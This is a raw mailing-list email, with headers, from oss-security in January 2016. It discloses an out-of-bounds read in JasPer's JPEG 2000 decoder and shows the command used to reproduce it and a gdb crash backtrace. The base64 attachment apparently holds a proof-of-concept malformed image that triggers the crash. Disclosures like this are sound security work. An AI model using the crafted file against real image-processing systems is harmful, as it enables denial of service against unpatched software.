X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3569" "Wednesday" "13" "January" "2016" "03:54:55" "+0000" "limingxing" "limingxing@360.cn" "<3626D6E697A150459C44C0E5D8D8D00E0DBD5177@EX02.corp.qihoo.net>" "72" "[oss-security] Out-of-bounds Read in the JasPer's jpc_pi_nextcprl() function" nil nil nil "1" "2016011303:54:55" "[oss-security] Out-of-bounds Read in the JasPer's jpc_pi_nextcprl() function" (number mark "U       limingxing@3 Jan 13   72/3569  " thread-indent "\"[oss-security] Out-of-bounds Read in the JasPer's jpc_pi_nextcprl() function\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 12215 invoked by uid 550); 13 Jan 2016 03:59:09 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 9998 invoked from network); 13 Jan 2016 03:55:17 -0000
From: limingxing <limingxing@360.cn>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: Out-of-bounds Read in the JasPer's jpc_pi_nextcprl() function
Thread-Index: AQHRTbUgihqFdCVkREi4hh3+NTTsKg==
Date: Wed, 13 Jan 2016 03:54:55 +0000
Message-ID: <3626D6E697A150459C44C0E5D8D8D00E0DBD5177@EX02.corp.qihoo.net>
Accept-Language: zh-CN, en-US
Content-Language: zh-CN
X-MS-Has-Attach: yes
X-MS-TNEF-Correlator:
x-originating-ip: [10.199.1.109]
Content-Type: multipart/mixed;
	boundary="_002_3626D6E697A150459C44C0E5D8D8D00E0DBD5177EX02corpqihoone_"
MIME-Version: 1.0
Subject: [oss-security] Out-of-bounds Read in the JasPer's jpc_pi_nextcprl() function

--_002_3626D6E697A150459C44C0E5D8D8D00E0DBD5177EX02corpqihoone_
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable


Hello,
We find a vulnerability in the way JasPer's jpc_pi_nextcprl() function pars=
ed certain JPEG 2000 image files.
I was successful in reproducing this issuel in the jasper-1.900.1-31.fc23.s=
rc.
The gdb info was:
Starting program: ./jasper-1.900.1-31.fc23.src/jasper-1.900.1/src/appl/jasp=
er -f ./jasper_poc/poc.jp2 -F temp.bmp -t jp2 -T bmp
warning: trailing garbage in marker segment (6 bytes)

Program received signal SIGSEGV, Segmentation fault.
jpc_pi_nextcprl (pi=3D0x80a4ab0) at jpc_t2cod.c:435
435			pi->xstep =3D pi->picomp->hsamp * (1 << (pirlvl->prcwidthexpn +
(gdb) bt
#0  jpc_pi_nextcprl (pi=3D0x80a4ab0) at jpc_t2cod.c:435
#1  jpc_pi_next (pi=3Dpi@entry=3D0x80a4ab0) at jpc_t2cod.c:125
#2  0x08062d85 in jpc_dec_decodepkts (dec=3Ddec@entry=3D0x809a5b8,=20
    pkthdrstream=3D0x8096308, in=3D0x8096308) at jpc_t2dec.c:441
#3  0x0806202a in jpc_dec_process_sod (dec=3D0x809a5b8, ms=3D0x0) at jpc_de=
c.c:591
#4  0x0806158d in jpc_dec_decode (dec=3D0x809a5b8) at jpc_dec.c:390
#5  jpc_decode (in=3Din@entry=3D0x8096308, optstr=3Doptstr@entry=3D0x0)
    at jpc_dec.c:254
#6  0x08056627 in jp2_decode (in=3D0x8096308, optstr=3D0x0) at jp2_dec.c:215
#7  0x08051a28 in jas_image_decode (in=3Din@entry=3D0x8096308,=20
    fmt=3D<optimized out>, optstr=3D0x0) at jas_image.c:379
#8  0x08048f19 in main (argc=3D9, argv=3D0xbffff094) at jasper.c:229


This vulnerability was found by Qihoo 360 Codesafe Team=

--_002_3626D6E697A150459C44C0E5D8D8D00E0DBD5177EX02corpqihoone_
Content-Type: application/octet-stream; name="jasper_poc.zip"
Content-Description: jasper_poc.zip
Content-Disposition: attachment; filename="jasper_poc.zip"; size=1150;
	creation-date="Wed, 13 Jan 2016 03:47:42 GMT";
	modification-date="Wed, 13 Jan 2016 03:47:42 GMT"
Content-Transfer-Encoding: base64

UEsDBBQAAAAIAGdLLUhKLlX5PwEAACcCAAAHAAAAcG9jLmpwMmNgYODJClBQ
4OVq5wKyRdJKKguyCowUgGwGKG1RWpqZkljAcO9N+1XBTW8ZAlgK/965BJRw
YGQAgwROBhRgAKF0gfozgLRYZkZKEZAGqWJnYGZnB2vjT87PKYIYIAC1LPm/
//9ABn2wGAtUAwywo/CZ2RkZIeh/EAMPUICVkZUFqOV/DIOyUr5cPkM+Q96j
dIZ0hrRH8T5AmOLBDISu/peAMPF/CoMEA2NAanpicWmxgmduYnpmXrqCc35R
wf94Bn4GRu/E7ESWUt0yYz0ToNK5QIGUUl2fxMrUIl3PvLR8K4Wc/PR4o2qX
1JySRF0XDd9gV039aKM4QzMtiJCPRlJlSWqxZmytjgKMzaWgoGugZ6CjADQ0
VdvAwAhJwBRdwBxdwBJVwFDPAiRgyPV/AgMXODwyGBj/T26gGfh/EwBQSwME
FAAAAAgAXF0tSH/dquknAgAAagQAAAoAAAByZWFkbWUudHh0nZNdb9owFIav
iZT/cKTewEaCYxJIqlLtZqt6N4lpt8hxnOA2H5ZtWtpfv2NCCgVpkxbJib/O
876vwWvLtJVtBUp3lWbNLcy2XSNmelbu3t9nT8wooYMozAgJo4thMI/CktN5
aDS/3OmmmFL1cR6CEsJjf6M6PsMWPikKwQ+wolFh3igILBymfgGOfO+V6Rad
3YLVTNbOY8V0zioBsoWG6WfEGlE1orUwXkD+ZoWZ+J7v/eyjgBZcyBdRgJFV
y2pYPz6svz/8nsK6r2JWdi2UbFfb0PeeFN8ouWnF3nKlaxgruSL7lLCY5WQC
zJnjG0t5V4T8Np4nvoev0WikZHC/N1YoWIHrK8m7RgX3W8Mw1BcYR3B353C6
fqlxWfNXWdit2KsWvvreuCryCeTW924IwH+4uIk+lR1KlPyGAfXbX2oj6mop
ANmTlCxokSbuYN2WQhxaVwj1bA2Msb/CNiARmbEkT6fge4APbtoW2lgtWNOv
LuYEV2V7Gp3JI8lZjyOUn3/IE8rO5fHvyIUxG9MVvf6ZamNwdArU85LM8eKB
FyVpcR3nAnWBmGcEEQkMU4cCDCHb8+R9tk5ZDLzqPx/LZNKfyCcsTWLELo7O
ksWCLntn9Fzkmn3KSAdS5H6y5UCKGE0PJGY2ssGL8S/Tvbmysas71JCNfMfL
0e3s/bXmgHTHssxQNT2qxmkZZf0NxNeY6Yqvsing9wWr8xIfksUDBK+7802R
8AdQSwECHwAUAAAACABnSy1ISi5V+T8BAAAnAgAABwAkAAAAAAAAACAAAAAA
AAAAcG9jLmpwMgoAIAAAAAAAAQAYAABFKoihTdEBaURwSa5N0QFpRHBJrk3R
AVBLAQIfABQAAAAIAFxdLUh/3arpJwIAAGoEAAAKACQAAAAAAAAAIAAAAGQB
AAByZWFkbWUudHh0CgAgAAAAAAABABgA9ZBFfrRN0QGTpUxjtE3RAZOlTGO0
TdEBUEsFBgAAAAACAAIAtQAAALMDAAAAAA==

--_002_3626D6E697A150459C44C0E5D8D8D00E0DBD5177EX02corpqihoone_--
